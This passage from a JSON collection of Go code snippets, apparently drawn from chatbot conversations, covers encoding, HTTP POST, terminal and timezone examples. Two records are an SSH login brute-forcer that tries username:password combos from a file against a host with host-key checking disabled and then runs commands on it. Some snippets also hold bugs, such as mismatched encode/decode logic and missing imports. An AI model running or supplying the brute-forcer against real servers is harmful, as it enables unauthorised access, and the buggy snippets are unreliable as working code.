    "code": "func outputFile(term *terminal.Terminal, filePath string) {\n    data, err := ioutil.ReadFile(filePath)\n    if err != nil {\n        term.Write([]byte(fmt.Sprintf(\"Failed to read file: %s\\n\", err)))\n    } else {\n        var byteData []byte\n        for _, char := range string(data) {\n            byteData = append(byteData, byte(char))\n        }\n        term.Write(byteData)\n    }\n}",
    "filename": "3e5f0f0ec458fe43278e10b9870141ac_10.go"
  },
  {
    "conversation_hash": "0d45d7bbb84b45033287696234c4defe",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type Name string\ntype Fruit string\n\nvar fruit Fruit\nvar name Name\n\nfruit = \"Apple\"\nname = Name(fruit)",
    "filename": "0d45d7bbb84b45033287696234c4defe_0.go"
  },
  {
    "conversation_hash": "9e161cc489321f8ecb2b28ac43abeec9",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "var resultBuilder strings.Builder\nfor _, v := range dataPtr { \n    character := rune(alphabetB256U[v]) \n    if character >= 128 { \n        resultBuilder.WriteRune(192 + (character >> 6))\n        resultBuilder.WriteRune(128 + (character & 63))\n    } else { \n        resultBuilder.WriteRune(character)\n    } \n} \nresult := resultBuilder.String()",
    "filename": "9e161cc489321f8ecb2b28ac43abeec9_0.go"
  },
  {
    "conversation_hash": "9e161cc489321f8ecb2b28ac43abeec9",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func decodeB256U(str string) []byte { \n    result := make([]byte, 0, len(str))\n    for i := 0; i < len(str); i++ {\n        unicode := rune(str[i]) \n        if unicode >= 128 { \n            unicode = (unicode - 192) << 6 | (rune(str[i+1]) - 128) & 63\n            i++ \n        } \n        result = append(result, byte(unicode))\n    } \n    return result\n}",
    "filename": "9e161cc489321f8ecb2b28ac43abeec9_1.go"
  },
  {
    "conversation_hash": "9e161cc489321f8ecb2b28ac43abeec9",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func randomize(dataPtr []byte) { \n    seed := time.Now().Unix() + rand.Int63() + int64(len(dataPtr)) + int64(dataPtr[0]) \n    rand.Seed(seed)\n    for i := 0; i < len(dataPtr); i++ { \n        dataPtr[i] = byte(rand.Int())\n    }\n}",
    "filename": "9e161cc489321f8ecb2b28ac43abeec9_2.go"
  },
  {
    "conversation_hash": "07f555f525f7cf621f28cc35fa035322",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"fmt\"\n\t\"math/rand\"\n\t\"reflect\"\n\t\"time\"\n)\n\nvar alphabetB256U [256]rune = [256]rune{\n\t192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207,\n\t208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223,\n\t224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239,\n\t240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255,\n}\n\nfunc encodeB256U(dataPtr []byte) string {\n\tvar buf bytes.Buffer\n\tfor _, v := range dataPtr {\n\t\tcharacter := rune(v)\n\t\tif character >= 128 {\n\t\t\tbuf.WriteRune(alphabetB256U[v])\n\t\t\tbuf.WriteRune(alphabetB256U[v-128])\n\t\t} else {\n\t\t\tbuf.WriteByte(v) // zmiana WriteRune na WriteByte\n\t\t}\n\t}\n\treturn buf.String()\n}\n\nfunc decodeB256U(str string) []byte {\n\tresult := make([]byte, 0, len(str)/2)\n\tdataPtr := 0\n\tvar unicode rune\n\tfor i := 0; i < len(str); i += 2 {\n\t\tcode1 := rune(str[i])\n\t\tif i+1 < len(str) {\n\t\t\tcode2 := rune(str[i+1])\n\t\t\tif code1 >= 128 && code2 >= 128 {\n\t\t\t\tunicode = (code1-192)<<6 | (code2-128)&63\n\t\t\t\tresult = append(result, byte(unicode))\n\t\t\t} else {\n\t\t\t\tresult = append(result, byte(code1))\n\t\t\t\ti-- // cofnij się o jeden indeks, aby powtórzyć dekodowanie dla tego samego znaku\n\t\t\t}\n\t\t} else {\n\t\t\tresult = append(result, byte(code1))\n\t\t}\n\t\tdataPtr++\n\t}\n\treturn result\n}\n\nfunc randomize(dataPtr []byte) {\n\trand.Seed(time.Now().Unix())\n\tfor i := 0; i < len(dataPtr); i++ {\n\t\tdataPtr[i] = byte(rand.Int())\n\t}\n}\n\nfunc main() {\n\tfmt.Println()\n\tfmt.Println(\"Examples of 128-bit of data in B256U Encoding\")\n\tfmt.Println(\"---------------------------------------------\")\n\tfor i := 0; i < 100; i++ {\n\t\tbinaryData := make([]byte, 128/8)\n\t\trandomize(binaryData)\n\n\t\ttext := encodeB256U(binaryData)\n\t\tfmt.Printf(\"[%s]\\t\", text)\n\n\t\tdecodedData := decodeB256U(text)\n\t\tif !reflect.DeepEqual(binaryData, decodedData) {\n\t\t\tpanic(\"check failed\")\n\t\t}\n\t}\n}",
    "filename": "07f555f525f7cf621f28cc35fa035322_0.go"
  },
  {
    "conversation_hash": "07f555f525f7cf621f28cc35fa035322",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "var alphabetB256U [256]rune = [256]rune{\n\t945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960,\n\t961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976,\n\t977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992,\n\t993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008,\n}",
    "filename": "07f555f525f7cf621f28cc35fa035322_1.go"
  },
  {
    "conversation_hash": "07f555f525f7cf621f28cc35fa035322",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"fmt\"\n\t\"math/rand\"\n\t\"reflect\"\n\t\"time\"\n)\n\nvar alphabetB256U [256]rune = [256]rune{\n\t945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960,\n\t961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976,\n\t977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992,\n\t993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008,\n}\n\nfunc encodeB256U(dataPtr []byte) string {\n\tvar buf bytes.Buffer\n\tfor _, v := range dataPtr {\n\t\tcharacter := rune(v)\n\t\tif character >= 128 {\n\t\t\tbuf.WriteRune(alphabetB256U[v])\n\t\t\tbuf.WriteRune(alphabetB256U[v-128])\n\t\t} else {\n\t\t\tbuf.WriteByte(v)\n\t\t}\n\t}\n\treturn buf.String()\n}\n\nfunc decodeB256U(str string) []byte {\n\tresult := make([]byte, 0, len(str)/2)\n\tdataPtr := 0\n\tvar unicode rune\n\tfor i := 0; i < len(str); i += 2 {\n\t\tcode1 := rune(str[i])\n\t\tif i+1 < len(str) {\n\t\t\tcode2 := rune(str[i+1])\n\t\t\tif code1 >= 128 && code2 >= 128 {\n\t\t\t\tunicode = (code1-192)<<6 | (code2-128)&63\n\t\t\t\tresult = append(result, byte(unicode))\n\t\t\t} else {\n\t\t\t\tresult = append(result, byte(code1))\n\t\t\t\ti-- // cofnij się o jeden indeks, aby powtórzyć dekodowanie dla tego samego znaku\n\t\t\t}\n\t\t} else {\n\t\t\tresult = append(result, byte(code1))\n\t\t}\n\t\tdataPtr++\n\t}\n\treturn result\n}\n\nfunc randomize(dataPtr []byte) {\n\trand.Seed(time.Now().Unix())\n\tfor i := 0; i < len(dataPtr); i++ {\n\t\tdataPtr[i] = byte(rand.Int())\n\t}\n}\n\nfunc main() {\n\tfmt.Println()\n\tfmt.Println(\"Examples of 128-bit of data in B256U Encoding\")\n\tfmt.Println(\"---------------------------------------------\")\n\tfor i := 0; i < 100; i++ {\n\t\tbinaryData := make([]byte, 128/8)\n\t\trandomize(binaryData)\n\n\t\ttext := encodeB256U(binaryData)\n\t\tfmt.Printf(\"[%s]\\t\", text)\n\n\t\tdecodedData := decodeB256U(text)\n\t\tif !reflect.DeepEqual(binaryData, decodedData) {\n\t\t\tpanic(\"check failed\")\n\t\t}\n\t}\n}",
    "filename": "07f555f525f7cf621f28cc35fa035322_2.go"
  },
  {
    "conversation_hash": "2bf468e893c364851810ca4c21e2c41d",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\t\"log\"\n\t\"net/http\"\n)\n\ntype Payload struct {\n\tMessage string `json:\"message\"`\n}\n\nfunc main() {\n\turl := \"https://example.com/api\"\n\tpayload := Payload{Message: \"Hello, JSON!\"}\n\n\treqBody, err := json.Marshal(payload)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tresp, err := http.Post(url, \"application/json\", bytes.NewBuffer(reqBody))\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer resp.Body.Close()\n\n\tif resp.StatusCode == http.StatusOK {\n\t\tlog.Println(\"JSON payload sent successfully!\")\n\t} else {\n\t\tlog.Println(\"Failed to send JSON payload. Status:\", resp.Status)\n\t}\n}",
    "filename": "2bf468e893c364851810ca4c21e2c41d_0.go"
  },
  {
    "conversation_hash": "2bf468e893c364851810ca4c21e2c41d",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\t\"log\"\n\t\"net/http\"\n)\n\ntype Payload struct {\n\tMessage string `json:\"message\"`\n\tURL     string\n}\n\nfunc (p Payload) Send() error {\n\treqBody, err := json.Marshal(p)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tresp, err := http.Post(p.URL, \"application/json\", bytes.NewBuffer(reqBody))\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer resp.Body.Close()\n\n\tif resp.StatusCode == http.StatusOK {\n\t\tlog.Println(\"JSON payload sent successfully!\")\n\t} else {\n\t\tlog.Println(\"Failed to send JSON payload. Status:\", resp.Status)\n\t}\n\treturn nil\n}\n\nfunc main() {\n\tpayload := Payload{\n\t\tMessage: \"Hello, JSON!\",\n\t\tURL:     \"https://example.com/api\", // Set the URL dynamically\n\t}\n\terr := payload.Send()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}",
    "filename": "2bf468e893c364851810ca4c21e2c41d_1.go"
  },
  {
    "conversation_hash": "65590f7dd806271ade8ada43d0bb3355",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\ntype MyStruct struct {\n\tURL string `json:\"url\"`\n}\n\nfunc main() {\n\tdata := MyStruct{\n\t\tURL: \"https://example.com\",\n\t}\n\n\t// Convert struct to JSON\n\tjsonData, err := json.Marshal(data)\n\tif err != nil {\n\t\tfmt.Println(\"Error converting struct to JSON:\", err)\n\t\treturn\n\t}\n\n\t// Send JSON via HTTP POST\n\tresp, err := http.Post(\"http://example.com/your-endpoint\", \"application/json\", bytes.NewBuffer(jsonData))\n\tif err != nil {\n\t\tfmt.Println(\"Error sending request:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\n\t// Check response\n\tif resp.StatusCode == http.StatusOK {\n\t\tfmt.Println(\"Request successful!\")\n\t} else {\n\t\tfmt.Println(\"Request failed with status code\", resp.StatusCode)\n\t}\n}",
    "filename": "65590f7dd806271ade8ada43d0bb3355_0.go"
  },
  {
    "conversation_hash": "65590f7dd806271ade8ada43d0bb3355",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\ntype MyStruct struct {\n\tURL string `json:\"url\"`\n}\n\nfunc (s MyStruct) SendRequest() error {\n\t// Convert struct to JSON\n\tjsonData, err := json.Marshal(s)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"Error converting struct to JSON: %w\", err)\n\t}\n\n\t// Send JSON via HTTP POST\n\tresp, err := http.Post(\"http://example.com/your-endpoint\", \"application/json\", bytes.NewBuffer(jsonData))\n\tif err != nil {\n\t\treturn fmt.Errorf(\"Error sending request: %w\", err)\n\t}\n\tdefer resp.Body.Close()\n\n\t// Check response\n\tif resp.StatusCode != http.StatusOK {\n\t\treturn fmt.Errorf(\"Request failed with status code: %d\", resp.StatusCode)\n\t}\n\n\treturn nil\n}\n\nfunc main() {\n\tdata := MyStruct{\n\t\tURL: \"https://example.com\",\n\t}\n\n\terr := data.SendRequest()\n\tif err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Request successful!\")\n}",
    "filename": "65590f7dd806271ade8ada43d0bb3355_1.go"
  },
  {
    "conversation_hash": "65590f7dd806271ade8ada43d0bb3355",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\ntype HTTPRequest struct {\n\tURL string `json:\"url\"`\n}\n\nfunc (r HTTPRequest) Send() error {\n\t// Convert struct to JSON\n\tjsonData, err := json.Marshal(r)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"Error converting struct to JSON: %w\", err)\n\t}\n\n\t// Send JSON via HTTP POST\n\tresp, err := http.Post(\"http://example.com/your-endpoint\", \"application/json\", bytes.NewBuffer(jsonData))\n\tif err != nil {\n\t\treturn fmt.Errorf(\"Error sending request: %w\", err)\n\t}\n\tdefer resp.Body.Close()\n\n\t// Check response\n\tif resp.StatusCode != http.StatusOK {\n\t\treturn fmt.Errorf(\"Request failed with status code: %d\", resp.StatusCode)\n\t}\n\n\treturn nil\n}\n\nfunc main() {\n\trequest := HTTPRequest{\n\t\tURL: \"https://example.com\",\n\t}\n\n\terr := request.Send()\n\tif err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Request successful!\")\n}",
    "filename": "65590f7dd806271ade8ada43d0bb3355_2.go"
  },
  {
    "conversation_hash": "65590f7dd806271ade8ada43d0bb3355",
    "code_index": 5,
    "language": "Go",
    "libraries": [
      "main",
      "other"
    ],
    "code": "package logging\n\nimport \"github.com/myusername/mymodule\"\n\nfunc OtherModuleFunction() {\n\t// Access the exported logger from main package\n\tmymodule.Logger.Println(\"Logger accessed from other package.\")\n}",
    "filename": "65590f7dd806271ade8ada43d0bb3355_5.go"
  },
  {
    "conversation_hash": "54495984f89ae3d6209a6ef38be92eab",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\n// CustomerA type\ntype CustomerA struct {\n\tName string\n}\n\n// CustomerB type\ntype CustomerB struct {\n\tName string\n}\n\n// Specialized method for CustomerA\nfunc (c CustomerA) DoSomething() {\n\tfmt.Println(\"CustomerA implementation:\", c.Name)\n}\n\n// Specialized method for CustomerB\nfunc (c CustomerB) DoSomething() {\n\tfmt.Println(\"CustomerB implementation:\", c.Name)\n}\n\nfunc main() {\n\t// Customer A instance\n\tcustomerA := CustomerA{Name: \"John Doe\"}\n\tcustomerA.DoSomething() // Outputs: CustomerA implementation: John Doe\n\n\t// Customer B instance\n\tcustomerB := CustomerB{Name: \"Jane Smith\"}\n\tcustomerB.DoSomething() // Outputs: CustomerB implementation: Jane Smith\n}",
    "filename": "54495984f89ae3d6209a6ef38be92eab_0.go"
  },
  {
    "conversation_hash": "041dc01f77ef0da7417c2e9a4a2e3896",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\nfunc main() {\n\tstrSlice := []string{\"go\", \"language\", \"expert\"} // 定义一个[]string\n\tjoinedStr := strings.Join(strSlice, \"_\")         // 使用strings.Join()函数拼接，指定连接符为'_'\n\tfmt.Println(joinedStr)                           // 输出拼接后的字符串\n}",
    "filename": "041dc01f77ef0da7417c2e9a4a2e3896_0.go"
  },
  {
    "conversation_hash": "fc8b03cc541ab86dd39e3adb1f995059",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "file"
    ],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"os\"\n\t\"strings\"\n\t\"time\"\n\n\t\"golang.org/x/crypto/ssh\"\n)\n\nconst (\n\tbannerTimeout = 5 * time.Second\n\tsshFile       = \"ssh.txt\"\n)\n\nfunc main() {\n\thost := \"your_server_ip\"\n\tcommands := []string{\n\t\t\"command_1\",\n\t\t\"command_2\",\n\t\t\"command_3\",\n\t}\n\n\t// Read username and password combos from file\n\tcombos, err := readSSHCombos(sshFile)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to read SSH combos: %s\", err)\n\t}\n\n\t// Attempt SSH connection with each combo\n\tfor _, combo := range combos {\n\t\tusername, password := parseCombo(combo)\n\t\terr := connectSSH(host, username, password, commands)\n\t\tif err == nil {\n\t\t\t// Successful connection, break the loop\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc readSSHCombos(file string) ([]string, error) {\n\tcombos := make([]string, 0)\n\n\tf, err := os.Open(file)\n\tif err != nil {\n\t\treturn combos, fmt.Errorf(\"failed to open file: %w\", err)\n\t}\n\tdefer f.Close()\n\n\tscanner := bufio.NewScanner(f)\n\tfor scanner.Scan() {\n\t\tline := strings.TrimSpace(scanner.Text())\n\t\tif line != \"\" {\n\t\t\tcombos = append(combos, line)\n\t\t}\n\t}\n\n\tif err := scanner.Err(); err != nil {\n\t\treturn combos, fmt.Errorf(\"failed to read file: %w\", err)\n\t}\n\n\treturn combos, nil\n}\n\nfunc parseCombo(combo string) (string, string) {\n\tparts := strings.SplitN(combo, \":\", 2)\n\tusername := strings.TrimSpace(parts[0])\n\tpassword := \"\"\n\tif len(parts) > 1 {\n\t\tpassword = strings.TrimSpace(parts[1])\n\t}\n\treturn username, password\n}\n\nfunc connectSSH(host, username, password string, commands []string) error {\n\tconfig := &ssh.ClientConfig{\n\t\tUser: username,\n\t\tAuth: []ssh.AuthMethod{\n\t\t\tssh.Password(password),\n\t\t},\n\t\tHostKeyCallback: ssh.InsecureIgnoreHostKey(),\n\t\tTimeout:         bannerTimeout,\n\t}\n\n\tclient, err := ssh.Dial(\"tcp\", host+\":22\", config)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"failed to connect: %w\", err)\n\t}\n\tdefer client.Close()\n\n\t// Run commands\n\tsession, err := client.NewSession()\n\tif err != nil {\n\t\treturn fmt.Errorf(\"failed to create session: %w\", err)\n\t}\n\tdefer session.Close()\n\n\tfor _, cmd := range commands {\n\t\toutput, err := session.CombinedOutput(cmd)\n\t\tif err != nil {\n\t\t\treturn fmt.Errorf(\"command execution error: %w\", err)\n\t\t}\n\t\tfmt.Println(\"Command Output:\", string(output))\n\t}\n\n\treturn nil\n}",
    "filename": "fc8b03cc541ab86dd39e3adb1f995059_0.go"
  },
  {
    "conversation_hash": "fc8b03cc541ab86dd39e3adb1f995059",
    "code_index": 2,
    "language": "Go",
    "libraries": [
      "file"
    ],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"os\"\n\t\"strings\"\n\t\"time\"\n\n\t\"golang.org/x/crypto/ssh\"\n)\n\nconst (\n\tbannerTimeout = 5 * time.Second\n\tsshFile       = \"ssh.txt\"\n)\n\nfunc main() {\n\thost := \"your_server_ip\"\n\tcommands := []string{\n\t\t\"command_1\",\n\t\t\"command_2\",\n\t\t\"command_3\",\n\t}\n\n\t// Read username and password combos from file\n\tcombos, err := readSSHCombos(sshFile)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to read SSH combos: %s\", err)\n\t}\n\n\tsuccessful := false\n\n\t// Attempt SSH connection with each combo\n\tfor _, combo := range combos {\n\t\tusername, password := parseCombo(combo)\n\t\terr := connectSSH(host, username, password, commands)\n\t\tif err == nil {\n\t\t\t// Successful connection, break the loop\n\t\t\tsuccessful = true\n\t\t\tbreak\n\t\t} else {\n\t\t\tfmt.Printf(\"Failed to connect with combo: %s\\nError: %s\\n\", combo, err)\n\t\t}\n\t}\n\n\tif !successful {\n\t\tfmt.Println(\"No successful SSH connection.\")\n\t}\n}\n\nfunc readSSHCombos(file string) ([]string, error) {\n\tcombos := make([]string, 0)\n\n\tf, err := os.Open(file)\n\tif err != nil {\n\t\treturn combos, fmt.Errorf(\"failed to open file: %w\", err)\n\t}\n\tdefer f.Close()\n\n\tscanner := bufio.NewScanner(f)\n\tfor scanner.Scan() {\n\t\tline := strings.TrimSpace(scanner.Text())\n\t\tif line != \"\" {\n\t\t\tcombos = append(combos, line)\n\t\t}\n\t}\n\n\tif err := scanner.Err(); err != nil {\n\t\treturn combos, fmt.Errorf(\"failed to read file: %w\", err)\n\t}\n\n\treturn combos, nil\n}\n\nfunc parseCombo(combo string) (string, string) {\n\tparts := strings.SplitN(combo, \":\", 2)\n\tusername := strings.TrimSpace(parts[0])\n\tpassword := \"\"\n\tif len(parts) > 1 {\n\t\tpassword = strings.TrimSpace(parts[1])\n\t}\n\treturn username, password\n}\n\nfunc connectSSH(host, username, password string, commands []string) error {\n\tconfig := &ssh.ClientConfig{\n\t\tUser: username,\n\t\tAuth: []ssh.AuthMethod{\n\t\t\tssh.Password(password),\n\t\t},\n\t\tHostKeyCallback: ssh.InsecureIgnoreHostKey(),\n\t\tTimeout:         bannerTimeout,\n\t}\n\n\tclient, err := ssh.Dial(\"tcp\", host+\":22\", config)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"failed to connect: %w\", err)\n\t}\n\tdefer client.Close()\n\n\t// Run commands\n\tsession, err := client.NewSession()\n\tif err != nil {\n\t\treturn fmt.Errorf(\"failed to create session: %w\", err)\n\t}\n\tdefer session.Close()\n\n\tfor _, cmd := range commands {\n\t\toutput, err := session.CombinedOutput(cmd)\n\t\tif err != nil {\n\t\t\treturn fmt.Errorf(\"command execution error: %w\", err)\n\t\t}\n\t\tfmt.Println(\"Command Output:\", string(output))\n\t}\n\n\treturn nil\n}",
    "filename": "fc8b03cc541ab86dd39e3adb1f995059_2.go"
  },
  {
    "conversation_hash": "fc8b03cc541ab86dd39e3adb1f995059",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc clearScreen() {\n\tfmt.Print(\"\\033[2J\")\n}\n\nfunc main() {\n\t// Clear the screen\n\tclearScreen()\n\tfmt.Println(\"Screen cleared!\")\n\n\t// Rest of your program\n\t// ...\n}",
    "filename": "fc8b03cc541ab86dd39e3adb1f995059_3.go"
  },
  {
    "conversation_hash": "fc8b03cc541ab86dd39e3adb1f995059",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\n\t\"golang.org/x/crypto/ssh/terminal\"\n)\n\nfunc clearScreen(term *terminal.Terminal) {\n\tclear := \"\\x1b[2J\"\n\tterm.Write([]byte(clear))\n}\n\nfunc main() {\n\tterm := terminal.NewTerminal(os.Stdout, \"\")\n\n\t// Clear the screen\n\tclearScreen(term)\n\tfmt.Println(\"Screen cleared!\")\n\n\t// Rest of your program\n\t// ...\n}",
    "filename": "fc8b03cc541ab86dd39e3adb1f995059_4.go"
  },
  {
    "conversation_hash": "87b8ef0cffa5e0b1e9fea0b6639087ce",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc myFunction() {\n\t// Check a condition\n\tif true {\n\t\tfmt.Println(\"Exiting program!\")\n\t\tos.Exit(1) // Terminate program with exit status 1\n\t}\n\n\t// Other code (not executed if condition is met)\n\tfmt.Println(\"Continuing execution...\")\n}\n\nfunc main() {\n\tmyFunction()\n\t// Other code (not executed if condition is met)\n\tfmt.Println(\"Program completed.\")\n}",
    "filename": "87b8ef0cffa5e0b1e9fea0b6639087ce_0.go"
  },
  {
    "conversation_hash": "87b8ef0cffa5e0b1e9fea0b6639087ce",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc checkCondition() {\n\t// Check a condition\n\tif true {\n\t\tfmt.Println(\"Exiting program!\")\n\t\tos.Exit(1) // Terminate program with exit status 1\n\t}\n\n\t// Other code (not executed if condition is met)\n\tfmt.Println(\"Continuing execution...\")\n}\n\nfunc main() {\n\tcheckCondition()\n\t// Other code (not executed if condition is met)\n\tfmt.Println(\"Program completed.\")\n}",
    "filename": "87b8ef0cffa5e0b1e9fea0b6639087ce_1.go"
  },
  {
    "conversation_hash": "87b8ef0cffa5e0b1e9fea0b6639087ce",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc myFunction() bool {\n\t// Check a condition\n\tif true {\n\t\tfmt.Println(\"Exiting program!\")\n\t\treturn true // Return true to indicate the condition is met\n\t}\n\n\t// Other code (not executed if condition is met)\n\tfmt.Println(\"Continuing execution...\")\n\treturn false // Return false if condition is not met\n}\n\nfunc main() {\n\tif myFunction() {\n\t\treturn // Exit the program if the condition is met\n\t}\n\n\t// Other code (not executed if condition is met)\n\tfmt.Println(\"Program completed.\")\n}",
    "filename": "87b8ef0cffa5e0b1e9fea0b6639087ce_2.go"
  },
  {
    "conversation_hash": "d7321ec176b27f95ccf1209d912601fe",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "their"
    ],
    "code": "import (\n\t\"time\"\n)\n\nfunc getUsersCurrentTime() time.Time {\n\tcurrentTime := time.Now().Local() // Get the current time in the server's location\n\n\t// To get the user's timezone, you can try to fetch it from their environment variables.\n\t// For example, if the user has the TZ environment variable set, you can parse it to get their timezone.\n\tuserTz := time.Local // Set a default timezone (e.g., server's timezone)\n\tif tzStr, ok := os.LookupEnv(\"TZ\"); ok { \n\t\tif userTz, err := time.LoadLocation(tzStr); err == nil {\n\t\t\tcurrentTime = currentTime.In(userTz) // Convert the current time to the user's timezone\n\t\t}\n\t}\n\n\treturn currentTime\n}",
    "filename": "d7321ec176b27f95ccf1209d912601fe_0.go"
  },
  {
    "conversation_hash": "d7321ec176b27f95ccf1209d912601fe",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func getGreeting() string {\n\tcurrentTime := getUsersCurrentTime()\n\n\thour := currentTime.Hour()\n\tgreeting := \"\"\n\tswitch {\n\tcase hour >= 5 && hour < 12:\n\t\tgreeting = \"Good morning\"\n\tcase hour >= 12 && hour < 17:\n\t\tgreeting = \"Good afternoon\"\n\tdefault:\n\t\tgreeting = \"Good evening\"\n\t}\n\n\treturn greeting\n}",
    "filename": "d7321ec176b27f95ccf1209d912601fe_1.go"
  },
  {
    "conversation_hash": "d7321ec176b27f95ccf1209d912601fe",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\t// Prompt the user to enter their timezone during the SSH login process\n\tvar userTz string\n\tfmt.Println(\"Please enter your timezone (e.g., America/New_York): \")\n\tfmt.Scan(&userTz)\n\n\tcurrentTime := time.Now().In(getUserLocation(userTz))\n\n\t// Use the currentTime to determine the appropriate greeting based on time of day\n\tgreeting := \"\"\n\thour := currentTime.Hour()\n\tswitch {\n\tcase hour >= 5 && hour < 12:\n\t\tgreeting = \"Good morning\"\n\tcase hour >= 12 && hour < 17:\n\t\tgreeting = \"Good afternoon\"\n\tdefault:\n\t\tgreeting = \"Good evening\"\n\t}\n\n\tfmt.Println(greeting)\n}\n\nfunc getUserLocation(userTz string) *time.Location {\n\tif loc, err := time.LoadLocation(userTz); err == nil {\n\t\treturn loc\n\t}\n\t// If the user enters an invalid timezone, assume a default location (e.g., UTC)\n\treturn time.UTC\n}",
    "filename": "d7321ec176b27f95ccf1209d912601fe_2.go"
  },
  {
    "conversation_hash": "8e179bbc33bd063bb274023b0d022e57",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "terminal"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"golang.org/x/crypto/ssh\"\n\t\"golang.org/x/crypto/ssh/terminal\"\n\t\"log\"\n\t\"net\"\n)\n\nfunc main() {\n\tconfig := &ssh.ServerConfig{}\n\tconfig.AddHostKey(privateKey)\n\n\t// Create a listener for SSH connections\n\tlistener, err := net.Listen(\"tcp\", \"localhost:22\")\n\tif err != nil {\n\t\tlog.Fatal(\"Failed to listen on port 22: \", err)\n\t}\n\n\t// Accept incoming SSH connections\n\tfor {\n\t\ttcpConn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tlog.Fatal(\"Failed to accept incoming connection: \", err)\n\t\t}\n\n\t\t// Start a new SSH server connection\n\t\t_, chans, reqs, err := ssh.NewServerConn(tcpConn, config)\n\t\tif err != nil {\n\t\t\tlog.Fatal(\"Failed to establish SSH connection: \", err)\n\t\t}\n\n\t\t// Handle incoming requests asynchronously\n\t\tgo ssh.DiscardRequests(reqs)\n\n\t\t// Handle incoming channels (e.g., shell, exec)\n\t\tgo handleChannels(chans)\n\t}\n}\n\nfunc handleChannels(chans <-chan ssh.NewChannel) {\n\tfor newChannel := range chans {\n\t\tif newChannel.ChannelType() == \"session\" {\n\t\t\t// Accept the session channel\n\t\t\tchannel, _, err := newChannel.Accept()\n\t\t\tif err != nil {\n\t\t\t\tlog.Fatal(\"Failed to accept channel: \", err)\n\t\t\t}\n\n\t\t\t// Update terminal 